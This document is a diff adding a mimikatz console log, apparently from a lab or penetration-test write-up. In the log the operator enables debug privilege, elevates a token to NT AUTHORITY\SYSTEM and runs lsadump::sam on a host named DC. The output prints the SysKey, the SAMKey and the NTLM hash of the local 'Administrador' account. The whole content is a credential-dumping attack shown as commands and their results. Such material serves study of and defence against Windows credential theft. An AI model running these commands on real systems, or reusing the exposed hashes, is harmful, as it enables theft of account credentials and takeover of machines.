@@ -1,0 +1,37 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+420	{0;000003e7} 0 D 19144     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Primary
+ -> Impersonated !
+ * Process Token : {0;00030f3f} 1 F 1599053   	ROOTED\roman	S-1-5-21-4001629950-4265076451-4074222949-1104	(15g,25p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 1629573   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : DC
+SysKey : b230a72f472b734d28a7eaae5ecb1277
+Local SID : S-1-5-21-2715677496-2017717502-3404678819
+
+SAMKey : e9b6ae5ea2fa346bf1892b342bb288b1
+
+RID  : 000001f4 (500)
+User : Administrador
+  Hash NTLM: 3e45171bc9c91d797d4c561b648ec753
+
+RID  : 000001f5 (501)
+User : Invitado
+
+mimikatz(commandline) # exit
+Bye!
